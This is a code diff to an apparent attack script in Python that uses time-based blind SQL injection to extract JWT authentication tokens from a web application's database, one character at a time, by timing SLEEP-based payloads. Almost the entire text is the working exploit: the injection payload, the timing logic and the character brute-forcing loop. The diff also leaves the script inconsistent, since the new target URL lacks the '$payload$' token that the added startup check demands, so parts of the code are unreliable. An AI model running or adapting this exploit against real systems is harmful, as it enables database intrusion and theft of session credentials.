@@ -1,15 +1,16 @@
 #!/usr/bin/env python3
 import requests
+import sys
 import time
 
 ## Config
 
 # The target URL. Must contain '$payload$' where the payload will be inserted.
-TARGET = "http://localhost/?id=2&jwt=$payload$"
+TARGET = "http://localhost/?id=2$payload"
 
 # The payload, which must sleep if (JWT_Char = $char$). Must contain '$index$' and
 #   '$char$' where the index being tested and current test character will be inserted.
-PAYLOAD = "' OR SUBSTR(CAST(jwt as BINARY), $index$ %2B 1, 1) <> '$char$' OR SLEEP(0.2) OR '"
+PAYLOAD = "' AND SUBSTR(CAST(jwt as BINARY), $index$ %2B 1, 1) = '$char$' AND SLEEP(0.2) OR '"
 
 # If a query takes longer than this then the SQL server slept
 SQL_SLEPT_THRESHOLD = 0.2
@@ -33,6 +34,7 @@ def test_payload(payload):
 
     return elapsed_time > SQL_SLEPT_THRESHOLD
 
+
 def test_char(index, char):
     """Test if a single character matches sleeps."""
     payload = PAYLOAD.replace("$index$", str(index)).replace("$char$", char)
@@ -50,7 +52,7 @@ def main():
     print("[+] Retriving JWT Tokens.....")
     print("[+] ", end="")
 
-    # generate binary trees
+    # a list of characters to test. The blank string means EOL
     charset = "_-/+=.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
     charset = [""] + list(charset)
 
@@ -69,4 +71,14 @@ def main():
 
 
 if __name__ == "__main__":
+    if not "$payload$" in TARGET:
+        print("Missing '$payload$' in TARGET config string.")
+        sys.exit(1)
+    if not "$index$" in PAYLOAD:
+        print("Missing '$index$' in PAYLOAD config string.")
+        sys.exit(2)
+    if not "$char$" in PAYLOAD:
+        print("Missing '$char$' in PAYLOAD config string.")
+        sys.exit(3)
+
     main()
